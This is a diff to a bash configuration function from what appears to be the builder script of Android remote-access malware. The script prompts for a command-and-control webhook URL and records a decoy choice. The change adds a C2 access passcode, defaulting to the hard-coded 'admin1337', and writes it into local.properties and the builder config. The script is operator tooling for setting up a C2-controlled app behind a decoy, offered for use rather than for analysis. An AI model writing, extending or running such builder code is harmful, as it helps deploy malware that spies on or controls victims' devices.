@@ -193,8 +193,11 @@ configure_app() {
     echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"
 
     EXISTING_WEBHOOK=""
+    EXISTING_PASS="admin1337"
     if [ -f "$PROJECT_DIR/local.properties" ]; then
         EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+        EP=$(grep "C2_PASSWORD=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+        [ -n "$EP" ] && EXISTING_PASS="$EP"
     fi
 
     if [ -n "$EXISTING_WEBHOOK" ]; then
@@ -205,11 +208,28 @@ configure_app() {
         read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
     fi
 
+    if [ -n "$EXISTING_PASS" ] && [ "$EXISTING_PASS" != "admin1337" ]; then
+        echo -e "${YELLOW}    Current C2 Access Passcode: $EXISTING_PASS${NC}"
+        read -p "    Enter C2 Access Passcode [Press Enter to Keep Current]: " C2_PASS
+        C2_PASS=${C2_PASS:-$EXISTING_PASS}
+    else
+        read -p "    Enter C2 Access Passcode [admin1337]: " C2_PASS
+        C2_PASS=${C2_PASS:-admin1337}
+    fi
+
     if grep -q "WEBHOOK_URL=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
         echo "WEBHOOK_URL=$WEB_URL" >> "$PROJECT_DIR/local.properties"
     fi
+
+    if grep -q "C2_PASSWORD=" "$PROJECT_DIR/local.properties"; then
+        sed_i "s|C2_PASSWORD=.*|C2_PASSWORD=$C2_PASS|g" "$PROJECT_DIR/local.properties"
+    else
+        echo "C2_PASSWORD=$C2_PASS" >> "$PROJECT_DIR/local.properties"
+    fi
+
+    echo "C2_PASS=\"$C2_PASS\"" >> "$CONFIG_FILE"
 
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
